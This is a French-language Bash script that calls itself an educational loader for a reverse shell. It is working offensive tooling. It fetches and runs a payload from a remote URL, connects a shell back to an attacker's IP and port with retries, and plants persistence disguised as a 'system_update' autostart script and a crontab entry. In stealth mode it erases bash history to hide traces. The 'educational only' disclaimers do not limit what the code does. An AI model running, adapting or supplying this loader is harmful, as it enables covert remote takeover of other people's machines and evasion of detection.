#!/bin/bash
# Loadeur pour Reverse Shell Bash
# Usage: ./loader_bash.sh [OPTIONS]
# Auteur: Script éducatif RSe

# Couleurs pour output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration par défaut
DEFAULT_IP="127.0.0.1"
DEFAULT_PORT="4444"
MAX_RETRY=3
DELAY_RETRY=5
STEALTH_MODE=false
PERSISTENCE=false
DOWNLOAD_MODE=false

# Fonctions utilitaires
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Affichage de l'aide
show_help() {
    cat << EOF
Loadeur Reverse Shell Bash

Usage: $0 [OPTIONS]

OPTIONS:
    -t, --target IP:PORT    Adresse cible (défaut: $DEFAULT_IP:$DEFAULT_PORT)
    -r, --retry NUM         Nombre de tentatives (défaut: $MAX_RETRY)
    -d, --delay SEC         Délai entre tentatives (défaut: $DELAY_RETRY sec)
    -s, --stealth           Mode furtif (désactive les logs verbeux)
    -p, --persistence       Active la persistance (crontab)
    -u, --url URL           Télécharge le reverse shell depuis URL
    -l, --local PATH        Utilise un script local (défaut: ./reverse_shell_bash.sh)
    -h, --help              Affiche cette aide

EXEMPLES:
    $0 -t 192.168.1.100:4444 -r 5
    $0 --stealth --persistence -t 10.0.0.1:8080
    $0 -u http://example.com/shell.sh -t 192.168.1.100:4444

USAGE ÉDUCATIF UNIQUEMENT - Environnement autorisé requis
EOF
}

# Fonction de retry avec backoff
retry_connection() {
    local ip="$1"
    local port="$2"
    local script_path="$3"
    local attempt=1

    while [ $attempt -le $MAX_RETRY ]; do
        if [ "$STEALTH_MODE" = false ]; then
            log_info "Tentative $attempt/$MAX_RETRY vers $ip:$port"
        fi

        # Exécution du reverse shell
        if [ -f "$script_path" ]; then
            timeout 10 bash "$script_path" "$ip" "$port" 2>/dev/null
            local exit_code=$?
            
            if [ $exit_code -eq 0 ]; then
                if [ "$STEALTH_MODE" = false ]; then
                    log_success "Connexion établie avec succès!"
                fi
                return 0
            fi
        else
            log_error "Script non trouvé: $script_path"
            return 1
        fi

        if [ $attempt -lt $MAX_RETRY ]; then
            if [ "$STEALTH_MODE" = false ]; then
                log_warning "Échec - Retry dans ${DELAY_RETRY}s..."
            fi
            sleep $DELAY_RETRY
        fi

        ((attempt++))
    done

    log_error "Échec après $MAX_RETRY tentatives"
    return 1
}

# Téléchargement du reverse shell
download_shell() {
    local url="$1"
    local temp_file="/tmp/.rs_$(date +%s).sh"
    
    if [ "$STEALTH_MODE" = false ]; then
        log_info "Téléchargement depuis: $url"
    fi

    if command -v curl >/dev/null 2>&1; then
        curl -s -o "$temp_file" "$url"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$temp_file" "$url"
    else
        log_error "curl ou wget requis pour le téléchargement"
        return 1
    fi

    if [ -f "$temp_file" ] && [ -s "$temp_file" ]; then
        chmod +x "$temp_file"
        echo "$temp_file"
        return 0
    else
        log_error "Échec du téléchargement"
        return 1
    fi
}

# Installation de persistance
install_persistence() {
    local script_path="$1"
    local target="$2"
    
    if [ "$STEALTH_MODE" = false ]; then
        log_info "Installation de la persistance..."
    fi

    # Création d'un script de persistance
    local persist_script="$HOME/.config/autostart/system_update.sh"
    mkdir -p "$(dirname "$persist_script")" 2>/dev/null

    cat > "$persist_script" << EOF
#!/bin/bash
# System Update Service
sleep \$((\$RANDOM % 300 + 60))
$(readlink -f "$0") -t $target -s >/dev/null 2>&1 &
EOF

    chmod +x "$persist_script"

    # Ajout au crontab si disponible
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null; echo "*/15 * * * * $persist_script >/dev/null 2>&1") | crontab - 2>/dev/null
    fi

    if [ "$STEALTH_MODE" = false ]; then
        log_success "Persistance installée"
    fi
}

# Nettoyage des traces
cleanup() {
    # Suppression des fichiers temporaires
    rm -f /tmp/.rs_*.sh 2>/dev/null
    
    # Nettoyage de l'historique si en mode stealth
    if [ "$STEALTH_MODE" = true ]; then
        history -c 2>/dev/null
        echo "" > ~/.bash_history 2>/dev/null
    fi
}

# Traitement des signaux
trap cleanup EXIT INT TERM

# Parse des arguments
SCRIPT_PATH="./reverse_shell_bash.sh"
TARGET_IP="$DEFAULT_IP"
TARGET_PORT="$DEFAULT_PORT"
REMOTE_URL=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            IFS=':' read -r TARGET_IP TARGET_PORT <<< "$2"
            shift 2
            ;;
        -r|--retry)
            MAX_RETRY="$2"
            shift 2
            ;;
        -d|--delay)
            DELAY_RETRY="$2"
            shift 2
            ;;
        -s|--stealth)
            STEALTH_MODE=true
            shift
            ;;
        -p|--persistence)
            PERSISTENCE=true
            shift
            ;;
        -u|--url)
            REMOTE_URL="$2"
            DOWNLOAD_MODE=true
            shift 2
            ;;
        -l|--local)
            SCRIPT_PATH="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Option inconnue: $1"
            show_help
            exit 1
            ;;
    esac
done

# Bannière
if [ "$STEALTH_MODE" = false ]; then
    cat << "EOF"
╔═══════════════════════════════════════════════════════╗
║               LOADEUR REVERSE SHELL                  ║
║                   Version 1.0                        ║
║                 ÉDUCATIF UNIQUEMENT                  ║
╚═══════════════════════════════════════════════════════╝
EOF
    echo
fi

# Vérifications préliminaires
if [ "$STEALTH_MODE" = false ]; then
    log_warning "Script éducatif - Utilisez uniquement dans un environnement autorisé"
    log_info "Cible: $TARGET_IP:$TARGET_PORT"
fi

# Téléchargement si nécessaire
if [ "$DOWNLOAD_MODE" = true ]; then
    SCRIPT_PATH=$(download_shell "$REMOTE_URL")
    if [ $? -ne 0 ]; then
        exit 1
    fi
fi

# Vérification du script
if [ ! -f "$SCRIPT_PATH" ]; then
    log_error "Script reverse shell non trouvé: $SCRIPT_PATH"
    exit 1
fi

# Installation de la persistance si demandée
if [ "$PERSISTENCE" = true ]; then
    install_persistence "$SCRIPT_PATH" "$TARGET_IP:$TARGET_PORT"
fi

# Lancement du reverse shell avec retry
if [ "$STEALTH_MODE" = false ]; then
    log_info "Lancement du reverse shell..."
fi

retry_connection "$TARGET_IP" "$TARGET_PORT" "$SCRIPT_PATH"
exit_code=$?

if [ "$STEALTH_MODE" = false ]; then
    if [ $exit_code -eq 0 ]; then
        log_success "Mission accomplie!"
    else
        log_error "Mission échouée!"
    fi
fi

exit $exit_code